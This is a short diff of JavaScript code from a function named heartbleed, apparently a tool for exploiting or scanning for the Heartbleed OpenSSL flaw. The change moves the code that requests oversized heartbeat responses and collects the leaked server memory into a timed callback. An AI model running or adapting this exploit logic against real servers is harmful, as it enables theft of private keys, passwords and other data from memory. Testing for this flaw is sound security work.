@@ -55,6 +55,22 @@ function heartbleed(ip, port, host) {
     }
 
     setTimeout(function() {
+      // NOTE: Will be picked up by isSessionReused
+      s.sslWrap = new binding.SSLWrap();
+      s.sslWrap.onheartbeat = function(buf) {
+        acc.push(buf);
+        total += buf.length;
+
+        // Print number of bytes downloaded
+        reportProgress(buf.length);
+
+        if (total < sent)
+          return;
+        var chunk = Buffer.concat(acc, total);
+
+        test(chunk);
+        send();
+      };
       send();
     }, 10);
 
@@ -66,22 +82,6 @@ function heartbleed(ip, port, host) {
       s.sslWrap.setHeartbeatLength(sent);
       s.pair.ssl.isSessionReused();
     }
-    // NOTE: Will be picked up by isSessionReused
-    s.sslWrap = new binding.SSLWrap();
-    s.sslWrap.onheartbeat = function(buf) {
-      acc.push(buf);
-      total += buf.length;
-
-      // Print number of bytes downloaded
-      reportProgress(buf.length);
-
-      if (total < sent)
-        return;
-      var chunk = Buffer.concat(acc, total);
-
-      test(chunk);
-      send();
-    };
     // Ignore all data
     s.on('data', function() { });
 
